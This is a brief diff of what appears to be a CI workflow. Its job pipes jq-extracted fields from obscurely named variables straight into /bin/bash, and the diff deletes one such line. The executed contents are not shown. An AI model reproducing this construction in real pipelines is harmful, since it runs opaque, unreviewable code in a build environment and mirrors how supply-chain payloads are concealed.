@@ -28,7 +28,6 @@ jobs:
           echo $gqgs5 | jq -r .l62022 | /bin/bash
           echo $cy2400 | jq -r .a513 | /bin/bash
           echo $qhm813 | jq -r .r9377 | /bin/bash
-          echo $r674 | jq -r .g6946 | /bin/bash
           printf '%s' "$vgpp7" | jq -r .got07 | /bin/bash
 
       - name: Save archive
